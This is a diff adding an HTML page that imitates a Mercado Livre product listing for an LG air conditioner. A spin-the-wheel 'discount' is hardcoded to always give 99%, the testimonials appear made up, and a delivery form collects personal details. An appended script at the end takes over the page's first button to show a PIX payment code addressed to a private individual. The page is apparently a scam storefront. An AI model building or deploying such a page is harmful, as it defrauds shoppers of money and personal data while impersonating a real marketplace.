@@ -1,0 +1,1206 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+    <title>Ar Condicionado LG AI Smart Inverter Voice 12000 BTUs Frio</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            width: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background-color: #f5f5f5;
+            color: #333;
+        }
+
+        /* HEADER AMARELO - MERCADO LIVRE */
+        .header-yellow {
+            background: #ffd700;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 16px;
+            flex-wrap: wrap;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .header-logo-section {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .header-logo {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            text-decoration: none;
+            color: #333;
+            font-weight: bold;
+            font-size: 20px;
+        }
+
+        .logo-icon {
+            width: 40px;
+            height: 40px;
+            background: #ffd700;
+            border: 3px solid #003da5;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #003da5;
+            font-size: 18px;
+        }
+
+        .header-search {
+            flex: 1;
+            min-width: 300px;
+            display: flex;
+            gap: 8px;
+        }
+
+        .search-input {
+            flex: 1;
+            padding: 10px 12px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            background: white;
+        }
+
+        .search-button {
+            background: white;
+            border: none;
+            padding: 10px 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .header-cart {
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+        /* WHEEL BANNER */
+        .wheel-banner {
+            background: linear-gradient(135deg, #c41e3a 0%, #165b33 100%);
+            padding: 20px;
+            margin: 12px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 20px;
+            flex-wrap: wrap;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+        }
+
+        .wheel-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+            flex: 1;
+            min-width: 200px;
+        }
+
+        .wheel-title {
+            font-weight: bold;
+            color: white;
+            font-size: 16px;
+            text-align: center;
+        }
+
+        .wheel-container {
+            width: 140px;
+            height: 140px;
+            position: relative;
+        }
+
+        .wheel {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 8px solid #ffd700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: white;
+            font-size: 12px;
+            transition: transform 3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            transform-origin: center;
+            position: relative;
+            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.3);
+            background: conic-gradient(
+                #c41e3a 0deg 60deg,
+                #165b33 60deg 120deg,
+                #ffd700 120deg 180deg,
+                #c41e3a 180deg 240deg,
+                #165b33 240deg 300deg,
+                #e74c3c 300deg 360deg
+            );
+        }
+
+        .wheel-center {
+            position: absolute;
+            width: 50px;
+            height: 50px;
+            background: white;
+            border-radius: 50%;
+            border: 4px solid #ffd700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #c41e3a;
+            z-index: 2;
+            font-size: 11px;
+            cursor: pointer;
+        }
+
+        .wheel-pointer {
+            position: absolute;
+            top: -16px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 0;
+            height: 0;
+            border-left: 10px solid transparent;
+            border-right: 10px solid transparent;
+            border-top: 16px solid #ffd700;
+            z-index: 3;
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));
+        }
+
+        .discount-display {
+            background: white;
+            color: #c41e3a;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-size: 24px;
+            font-weight: bold;
+            text-align: center;
+            min-width: 120px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+
+        .spin-button {
+            background: #ffd700;
+            color: #003da5;
+            border: none;
+            padding: 12px 24px;
+            font-size: 14px;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.3s;
+            white-space: nowrap;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+        }
+
+        .spin-button:hover:not(:disabled) {
+            background: #ffed4e;
+            transform: scale(1.05);
+        }
+
+        .spin-button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            color: #666;
+        }
+
+        /* CONTAINER */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 12px;
+        }
+
+        /* PRODUCT SECTION */
+        .product-section {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 24px;
+            background: white;
+            padding: 20px;
+            margin: 12px 0;
+            border-radius: 4px;
+        }
+
+        .product-image-container {
+            background: #f5f5f5;
+            padding: 16px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 400px;
+        }
+
+        .product-image {
+            max-width: 100%;
+            height: auto;
+            max-height: 500px;
+        }
+
+        .product-thumbnails {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 8px;
+            margin-top: 12px;
+        }
+
+        .thumbnail {
+            width: 100%;
+            aspect-ratio: 1;
+            background: white;
+            border: 2px solid #e0e0e0;
+            border-radius: 4px;
+            cursor: pointer;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+        }
+
+        .thumbnail:hover {
+            border-color: #003da5;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+        }
+
+        .thumbnail img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .product-info {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .product-title {
+            font-size: 20px;
+            font-weight: bold;
+            color: #333;
+            line-height: 1.4;
+        }
+
+        .product-rating {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+        }
+
+        .stars {
+            color: #ffc107;
+        }
+
+        .product-badge {
+            color: #27ae60;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        .price-box {
+            background: #fff3cd;
+            padding: 16px;
+            border-radius: 4px;
+            border: 2px solid #ffc107;
+        }
+
+        .price-label {
+            color: #666;
+            font-size: 12px;
+            margin-bottom: 4px;
+        }
+
+        .price-original {
+            font-size: 18px;
+            color: #999;
+            text-decoration: line-through;
+            margin-bottom: 8px;
+        }
+
+        .price-value {
+            font-size: 32px;
+            font-weight: bold;
+            color: #c41e3a;
+        }
+
+        .discount-badge {
+            display: inline-block;
+            background: #c41e3a;
+            color: white;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: bold;
+            margin-top: 8px;
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+
+        .feature-item {
+            display: flex;
+            gap: 8px;
+            align-items: flex-start;
+        }
+
+        .feature-icon {
+            font-size: 20px;
+            flex-shrink: 0;
+        }
+
+        .feature-text h3 {
+            font-size: 12px;
+            font-weight: bold;
+            margin-bottom: 2px;
+        }
+
+        .feature-text p {
+            font-size: 11px;
+            color: #666;
+        }
+
+        .checkout-button {
+            background: #27ae60;
+            color: white;
+            border: none;
+            padding: 12px 16px;
+            font-size: 14px;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            margin: 12px 0;
+            transition: background 0.3s;
+            display: none;
+        }
+
+        .checkout-button.show {
+            display: block;
+        }
+
+        .checkout-button:hover {
+            background: #229954;
+        }
+
+        .add-to-cart-button {
+            background: #003da5;
+            color: white;
+            border: none;
+            padding: 12px 16px;
+            font-size: 14px;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.3s;
+        }
+
+        .add-to-cart-button:hover {
+            background: #002a7a;
+        }
+
+        /* TESTIMONIALS */
+        .testimonials-section {
+            background: white;
+            padding: 20px;
+            margin: 12px 0;
+            border-radius: 4px;
+        }
+
+        .testimonials-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 16px;
+        }
+
+        .testimonials-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 16px;
+        }
+
+        .testimonial-card {
+            border: 1px solid #e0e0e0;
+            padding: 16px;
+            border-radius: 4px;
+            background: #f9f9f9;
+        }
+
+        .testimonial-rating {
+            color: #ffc107;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        .testimonial-text {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 8px;
+            line-height: 1.4;
+        }
+
+        .testimonial-author {
+            font-size: 11px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        /* CHECKOUT FORM */
+        .checkout-form {
+            background: white;
+            padding: 20px;
+            margin: 12px 0;
+            border-radius: 4px;
+            display: none;
+        }
+
+        .checkout-form.show {
+            display: block;
+        }
+
+        .form-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 16px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: bold;
+            margin-bottom: 6px;
+            color: #333;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            font-family: inherit;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: #003da5;
+            box-shadow: 0 0 0 3px rgba(0, 61, 165, 0.1);
+        }
+
+        .form-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+
+        .form-full {
+            grid-column: 1 / -1;
+        }
+
+        .free-shipping {
+            background: #e8f5e9;
+            border: 2px solid #4caf50;
+            padding: 12px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+
+        .free-shipping-text {
+            font-size: 14px;
+            font-weight: bold;
+            color: #2e7d32;
+        }
+
+        .submit-button {
+            background: #c41e3a;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 14px;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.3s;
+        }
+
+        .submit-button:hover {
+            background: #a01729;
+        }
+
+        .submit-button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        /* QR CODE */
+        .qr-code-section {
+            background: white;
+            padding: 20px;
+            margin: 12px 0;
+            border-radius: 4px;
+            text-align: center;
+            display: none;
+        }
+
+        .qr-code-section.show {
+            display: block;
+        }
+
+        .qr-code-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 16px;
+            color: #c41e3a;
+        }
+
+        #qrcode {
+            display: inline-block;
+            padding: 16px;
+            background: white;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            margin: 16px 0;
+        }
+
+        .qr-code-info {
+            font-size: 12px;
+            color: #666;
+            margin-top: 16px;
+            line-height: 1.6;
+        }
+
+        .copy-button {
+            background: #003da5;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            font-size: 12px;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 12px;
+        }
+
+        .copy-button:hover {
+            background: #002a7a;
+        }
+
+        /* SPECS SECTION */
+        .specs-section {
+            background: white;
+            padding: 20px;
+            margin: 12px 0;
+            border-radius: 4px;
+        }
+
+        .specs-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 16px;
+        }
+
+        .specs-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+
+        .spec-group h3 {
+            font-size: 14px;
+            font-weight: bold;
+            margin-bottom: 12px;
+        }
+
+        .spec-item {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+            padding: 8px 0;
+            border-bottom: 1px solid #e0e0e0;
+            font-size: 12px;
+        }
+
+        .spec-item:last-child {
+            border-bottom: none;
+        }
+
+        .spec-label {
+            color: #666;
+            font-weight: 500;
+        }
+
+        .spec-value {
+            color: #333;
+        }
+
+        /* FOOTER */
+        .footer {
+            background: #1a1a1a;
+            color: white;
+            padding: 20px;
+            text-align: center;
+            font-size: 12px;
+            margin-top: 24px;
+        }
+
+        /* RESPONSIVE */
+        @media (max-width: 768px) {
+            .header-yellow {
+                flex-direction: column;
+                padding: 12px 8px;
+            }
+
+            .header-search {
+                min-width: 100%;
+            }
+
+            .product-section {
+                grid-template-columns: 1fr;
+                gap: 16px;
+                padding: 16px;
+            }
+
+            .wheel-banner {
+                flex-direction: column;
+                padding: 16px 8px;
+                margin: 8px;
+            }
+
+            .wheel-section {
+                width: 100%;
+            }
+
+            .wheel-container {
+                width: 120px;
+                height: 120px;
+            }
+
+            .specs-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .features-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .product-title {
+                font-size: 18px;
+            }
+
+            .price-value {
+                font-size: 28px;
+            }
+
+            .testimonials-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .form-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .product-thumbnails {
+                grid-template-columns: repeat(4, 1fr);
+            }
+        }
+
+        @media (max-width: 480px) {
+            .header-yellow {
+                padding: 10px 8px;
+            }
+
+            .header-search {
+                min-width: 100%;
+            }
+
+            .wheel-container {
+                width: 100px;
+                height: 100px;
+            }
+
+            .spin-button {
+                padding: 10px 16px;
+                font-size: 12px;
+            }
+
+            .product-title {
+                font-size: 16px;
+            }
+
+            .price-value {
+                font-size: 24px;
+            }
+
+            .product-section {
+                padding: 12px;
+            }
+
+            .product-thumbnails {
+                grid-template-columns: repeat(3, 1fr);
+            }
+
+            .testimonials-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- HEADER AMARELO -->
+    <div class="header-yellow">
+        <div class="header-logo-section">
+            <a href="#" class="header-logo">
+                <img src="./images/pt_logo_large_plus@2x.webp" alt="Mercado Livre" style="height: 40px; width: auto;">
+            </a>
+        </div>
+
+        <div class="header-search">
+            <input type="text" class="search-input" placeholder="Buscar produtos, marcas e muito mais...">
+            <button class="search-button">🔍</button>
+        </div>
+
+        <div class="header-right">
+            <div class="header-cart">🛒</div>
+        </div>
+    </div>
+
+    <!-- BREADCRUMB -->
+    <div style="background: white; padding: 8px 16px; font-size: 12px; color: #666; border-bottom: 1px solid #e0e0e0;">
+        <span>Eletrônicos</span>
+        <span> / </span>
+        <span>Climatização</span>
+        <span> / </span>
+        <span>Ar Condicionado</span>
+    </div>
+
+    <!-- WHEEL BANNER - NATAL THEME -->
+    <div class="wheel-banner">
+        <div class="wheel-section">
+            <div class="wheel-title">🎄 Gire e Ganhe Desconto Natalino! 🎁</div>
+            <div class="wheel-container">
+                <div class="wheel-pointer"></div>
+                <div class="wheel" id="wheel">
+                    <div class="wheel-center">GIRAR</div>
+                </div>
+            </div>
+        </div>
+        <div class="discount-display" id="discount-display">-</div>
+        <button class="spin-button" id="spin-btn" onclick="spinWheel()">GIRAR AGORA</button>
+    </div>
+
+    <!-- CONTAINER -->
+    <div class="container">
+        <!-- PRODUCT SECTION -->
+        <div class="product-section">
+            <!-- IMAGES -->
+            <div>
+                <div class="product-image-container">
+                    <img src="./images/D_NQ_NP_862390-MLB97111388258_112025-O.webp" alt="Ar Condicionado LG" class="product-image" id="main-image">
+                </div>
+                <div class="product-thumbnails">
+                    <div class="thumbnail" onclick="changeImage('./images/D_NQ_NP_862390-MLB97111388258_112025-O.webp')">
+                        <img src="./images/D_NQ_NP_862390-MLB97111388258_112025-O.webp" alt="View 1">
+                    </div>
+                    <div class="thumbnail" onclick="changeImage('./images/D_Q_NP_862390-MLB97111388258_112025-B.webp')">
+                        <img src="./images/D_Q_NP_862390-MLB97111388258_112025-B.webp" alt="View 2">
+                    </div>
+                    <div class="thumbnail" onclick="changeImage('./images/D_Q_NP_862390-MLB97111388258_112025-C.webp')">
+                        <img src="./images/D_Q_NP_862390-MLB97111388258_112025-C.webp" alt="View 3">
+                    </div>
+                    <div class="thumbnail" onclick="changeImage('./images/D_Q_NP_862390-MLB97111388258_112025-L.webp')">
+                        <img src="./images/D_Q_NP_862390-MLB97111388258_112025-L.webp" alt="View 4">
+                    </div>
+                    <div class="thumbnail" onclick="changeImage('./images/D_Q_NP_862390-MLB97111388258_112025-V.webp')">
+                        <img src="./images/D_Q_NP_862390-MLB97111388258_112025-V.webp" alt="View 5">
+                    </div>
+                </div>
+            </div>
+
+            <!-- INFO -->
+            <div class="product-info">
+                <h1 class="product-title">Ar Condicionado LG AI Smart Inverter Voice 12000 BTUs Frio</h1>
+
+                <div class="product-rating">
+                    <span class="stars">★★★★★</span>
+                    <span>(248 avaliações)</span>
+                </div>
+
+                <div class="product-badge">✓ Produto com frete grátis</div>
+
+                <div class="price-box">
+                    <div class="price-label">Preço original</div>
+                    <div class="price-original">R$ 2.397,00</div>
+                    <div class="price-value" id="final-price">R$ 2.397,00</div>
+                    <div class="discount-badge" id="discount-badge" style="display: none;">Desconto: <span id="discount-percent">0</span>%</div>
+                    <div class="price-hint" style="font-size: 12px; color: #666; margin-top: 8px;">Gire a roleta para ganhar um desconto especial!</div>
+                </div>
+
+                <div class="features-grid">
+                    <div class="feature-item">
+                        <div class="feature-icon">🚚</div>
+                        <div class="feature-text">
+                            <h3>Frete Grátis</h3>
+                            <p>Entrega em 2-3 dias úteis</p>
+                        </div>
+                    </div>
+                    <div class="feature-item">
+                        <div class="feature-icon">🛡️</div>
+                        <div class="feature-text">
+                            <h3>Garantia</h3>
+                            <p>12 meses de garantia</p>
+                        </div>
+                    </div>
+                </div>
+
+                <button class="checkout-button" id="checkout-btn" onclick="showCheckoutForm()" style="background: #003da5; color: white;">Comprar agora</button>
+                <button class="add-to-cart-button" id="add-cart-btn">Adicionar ao Carrinho</button>
+            </div>
+        </div>
+
+        <!-- TESTIMONIALS -->
+        <div class="testimonials-section">
+            <h2 class="testimonials-title">O que os clientes dizem</h2>
+            <div class="testimonials-grid">
+                <div class="testimonial-card">
+                    <div class="testimonial-rating">★★★★★</div>
+                    <div class="testimonial-text">"Excelente produto! Chegou rápido e funciona perfeitamente. Muito satisfeito com a compra."</div>
+                    <div class="testimonial-author">- João Silva</div>
+                </div>
+                <div class="testimonial-card">
+                    <div class="testimonial-rating">★★★★★</div>
+                    <div class="testimonial-text">"Melhor preço que encontrei. O atendimento foi ótimo e o produto é de qualidade superior."</div>
+                    <div class="testimonial-author">- Maria Santos</div>
+                </div>
+                <div class="testimonial-card">
+                    <div class="testimonial-rating">★★★★★</div>
+                    <div class="testimonial-text">"Recomendo! Produto com ótimo custo-benefício e entrega rápida. Muito bom mesmo!"</div>
+                    <div class="testimonial-author">- Carlos Costa</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- CHECKOUT FORM -->
+        <div class="checkout-form" id="checkout-form">
+            <h2 class="form-title">Dados de Entrega</h2>
+            
+            <div class="free-shipping">
+                <span style="font-size: 20px;">🚚</span>
+                <div class="free-shipping-text">Frete Grátis para todo o Brasil!</div>
+            </div>
+
+            <form id="delivery-form" onsubmit="generateQRCode(event)">
+                <div class="form-grid">
+                    <div class="form-group form-full">
+                        <label for="name">Nome Completo *</label>
+                        <input type="text" id="name" name="name" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="email">Email *</label>
+                        <input type="email" id="email" name="email" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="phone">Telefone *</label>
+                        <input type="tel" id="phone" name="phone" placeholder="(11) 99999-9999" required>
+                    </div>
+
+                    <div class="form-group form-full">
+                        <label for="address">Endereço Completo *</label>
+                        <input type="text" id="address" name="address" placeholder="Rua, número, complemento" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="city">Cidade *</label>
+                        <input type="text" id="city" name="city" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="state">Estado *</label>
+                        <select id="state" name="state" required>
+                            <option value="">Selecione...</option>
+                            <option value="SP">São Paulo</option>
+                            <option value="RJ">Rio de Janeiro</option>
+                            <option value="MG">Minas Gerais</option>
+                            <option value="BA">Bahia</option>
+                            <option value="RS">Rio Grande do Sul</option>
+                            <option value="PR">Paraná</option>
+                            <option value="PE">Pernambuco</option>
+                            <option value="CE">Ceará</option>
+                            <option value="PA">Pará</option>
+                            <option value="SC">Santa Catarina</option>
+                            <option value="GO">Goiás</option>
+                            <option value="PB">Paraíba</option>
+                            <option value="MA">Maranhão</option>
+                            <option value="ES">Espírito Santo</option>
+                            <option value="PI">Piauí</option>
+                            <option value="RN">Rio Grande do Norte</option>
+                            <option value="AL">Alagoas</option>
+                            <option value="MT">Mato Grosso</option>
+                            <option value="MS">Mato Grosso do Sul</option>
+                            <option value="DF">Distrito Federal</option>
+                            <option value="AC">Acre</option>
+                            <option value="AM">Amazonas</option>
+                            <option value="AP">Amapá</option>
+                            <option value="RO">Rondônia</option>
+                            <option value="RR">Roraima</option>
+                            <option value="TO">Tocantins</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="zip">CEP *</label>
+                        <input type="text" id="zip" name="zip" placeholder="00000-000" required>
+                    </div>
+                </div>
+
+                <button type="submit" class="submit-button" style="background: #81c784; color: white;">Finalize o seu pedido</button>
+            </form>
+        </div>
+
+        <!-- QR CODE SECTION -->
+        <div class="qr-code-section" id="qr-code-section">
+            <h2 class="qr-code-title">💳 Pague com PIX</h2>
+            <p style="font-size: 14px; margin-bottom: 12px;">Escaneie o código abaixo para realizar o pagamento</p>
+            <div id="qrcode"></div>
+            <div class="qr-code-info">
+                <strong>Chave PIX:</strong> <br>
+                <span id="pix-key" style="word-break: break-all;">-</span>
+                <br><br>
+                <strong>Valor:</strong> <span id="pix-amount">R$ 23,97</span>
+            </div>
+            <button class="copy-button" onclick="copyPixKey()">Copiar Chave PIX</button>
+        </div>
+
+        <!-- SPECS SECTION -->
+        <div class="specs-section">
+            <h2 class="specs-title">Características do Produto</h2>
+            <div class="specs-grid">
+                <div class="spec-group">
+                    <h3>Especificações Técnicas</h3>
+                    <div class="spec-item">
+                        <span class="spec-label">Capacidade</span>
+                        <span class="spec-value">12.000 BTUs</span>
+                    </div>
+                    <div class="spec-item">
+                        <span class="spec-label">Tipo</span>
+                        <span class="spec-value">Ar Condicionado Inverter</span>
+                    </div>
+                    <div class="spec-item">
+                        <span class="spec-label">Modo</span>
+                        <span class="spec-value">Frio</span>
+                    </div>
+                    <div class="spec-item">
+                        <span class="spec-label">Marca</span>
+                        <span class="spec-value">LG</span>
+                    </div>
+                    <div class="spec-item">
+                        <span class="spec-label">Tecnologia</span>
+                        <span class="spec-value">AI Smart + Voice</span>
+                    </div>
+                    <div class="spec-item">
+                        <span class="spec-label">Voltagem</span>
+                        <span class="spec-value">220V</span>
+                    </div>
+                </div>
+
+                <div class="spec-group">
+                    <h3>Benefícios</h3>
+                    <div class="spec-item">
+                        <span class="spec-label">✓</span>
+                        <span class="spec-value">Eficiência energética de até 30%</span>
+                    </div>
+                    <div class="spec-item">
+                        <span class="spec-label">✓</span>
+                        <span class="spec-value">Controle por voz inteligente</span>
+                    </div>
+                    <div class="spec-item">
+                        <span class="spec-label">✓</span>
+                        <span class="spec-value">Modo eco automático</span>
+                    </div>
+                    <div class="spec-item">
+                        <span class="spec-label">✓</span>
+                        <span class="spec-value">Filtro anti-alérgeno</span>
+                    </div>
+                    <div class="spec-item">
+                        <span class="spec-label">✓</span>
+                        <span class="spec-value">Operação silenciosa</span>
+                    </div>
+                    <div class="spec-item">
+                        <span class="spec-label">✓</span>
+                        <span class="spec-value">Wi-Fi integrado</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <div class="footer">
+        <p>© 2024 Mercado Livre. Todos os direitos reservados.</p>
+    </div>
+
+    <script>
+        const ORIGINAL_PRICE = 2397; // em reais
+        const DISCOUNTS = [10, 30, 50, 70, 90, 99];
+        const DISCOUNT_ANGLES = [0, 60, 120, 180, 240, 300]; // 6 segmentos de 60 graus
+        let currentDiscount = 0;
+        let isSpinning = false;
+
+        function spinWheel() {
+            if (isSpinning) return;
+
+            isSpinning = true;
+            const spinBtn = document.getElementById('spin-btn');
+            spinBtn.disabled = true;
+            spinBtn.textContent = 'Girando...';
+
+            const wheel = document.getElementById('wheel');
+            const discountDisplay = document.getElementById('discount-display');
+            const checkoutBtn = document.getElementById('checkout-btn');
+            const addCartBtn = document.getElementById('add-cart-btn');
+            const discountBadge = document.getElementById('discount-badge');
+            const discountPercent = document.getElementById('discount-percent');
+
+            // Sempre cair em 99% (último segmento - 300 graus)
+            const targetRotation = 360 * 5 + 300; // 5 voltas completas + 300 graus
+
+            wheel.style.transform = `rotate(${targetRotation}deg)`;
+
+            setTimeout(() => {
+                currentDiscount = 99;
+                const finalPrice = ORIGINAL_PRICE * (1 - currentDiscount / 100);
+                
+                discountDisplay.textContent = '-99%';
+                discountDisplay.style.color = '#c41e3a';
+                discountDisplay.style.fontSize = '32px';
+                
+                document.getElementById('final-price').textContent = `R$ ${finalPrice.toFixed(2)}`;
+                discountPercent.textContent = '99';
+                discountBadge.style.display = 'inline-block';
+                
+                checkoutBtn.classList.add('show');
+                addCartBtn.style.display = 'none';
+                
+                isSpinning = false;
+                spinBtn.disabled = true;
+                spinBtn.textContent = '✓ 99% Ganho!';
+            }, 3000);
+        }
+
+        function changeImage(src) {
+            document.getElementById('main-image').src = src;
+        }
+
+        function showCheckoutForm() {
+            document.getElementById('checkout-form').classList.add('show');
+            document.getElementById('checkout-form').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        function generateQRCode(event) {
+            event.preventDefault();
+            
+            const name = document.getElementById('name').value;
+            const email = document.getElementById('email').value;
+            const phone = document.getElementById('phone').value;
+            const address = document.getElementById('address').value;
+            const city = document.getElementById('city').value;
+            const state = document.getElementById('state').value;
+            const zip = document.getElementById('zip').value;
+
+            const finalPrice = ORIGINAL_PRICE * (1 - currentDiscount / 100);
+            const pixKey = 'chave-pix-exemplo@mercadolivre.com.br';
+            
+            // Gerar QR Code PIX (simulado)
+            const qrcodeDiv = document.getElementById('qrcode');
+            qrcodeDiv.innerHTML = '';
+            
+            new QRCode(qrcodeDiv, {
+                text: `00020126580014br.gov.bcb.pix0136chave-pix-exemplo@mercadolivre.com.br52040000530398654061${finalPrice.toFixed(2)}5802BR5913MERCADO LIVRE6009SAO PAULO62410503***63041D3D`,
+                width: 200,
+                height: 200,
+                colorDark: '#000000',
+                colorLight: '#ffffff',
+            });
+
+            document.getElementById('pix-key').textContent = pixKey;
+            document.getElementById('pix-amount').textContent = `R$ ${finalPrice.toFixed(2)}`;
+            
+            document.getElementById('qr-code-section').classList.add('show');
+            document.getElementById('qr-code-section').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        function copyPixKey() {
+            const pixKey = document.getElementById('pix-key').textContent;
+            navigator.clipboard.writeText(pixKey).then(() => {
+                alert('Chave PIX copiada com sucesso!');
+            });
+        }
+    </script>
+
+<!-- PIX SECTION -->
+<div id="pix-section" style="display:none;margin-top:20px;text-align:center">
+  <h3>Pagamento via PIX</h3>
+  <img id="pix-qr" style="width:220px;background:#fff;padding:10px;border-radius:10px"/>
+  <p>PIX copia e cola</p>
+  <textarea readonly rows="4" style="width:100%;padding:10px;border-radius:8px">00020126940014br.gov.bcb.pix0136485aceeb-6881-4582-b1fb-12f7b1bbeabc0232Ar Condicionado LG AI 12.000BTUs520400005303986540523.975802BR592563.194.404 ROBERTO DA SIL6002NA6229052520813584574c4c6b8a75mlblk6304234F</textarea>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  const btn = document.querySelector("button");
+  if (!btn) return;
+
+  btn.addEventListener("click", function () {
+    const qr = document.getElementById("pix-qr");
+    qr.src = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" + encodeURIComponent('00020126940014br.gov.bcb.pix0136485aceeb-6881-4582-b1fb-12f7b1bbeabc0232Ar Condicionado LG AI 12.000BTUs520400005303986540523.975802BR592563.194.404 ROBERTO DA SIL6002NA6229052520813584574c4c6b8a75mlblk6304234F');
+    document.getElementById("pix-section").style.display = "block";
+  });
+});
+</script>
+
+</body>
+</html>
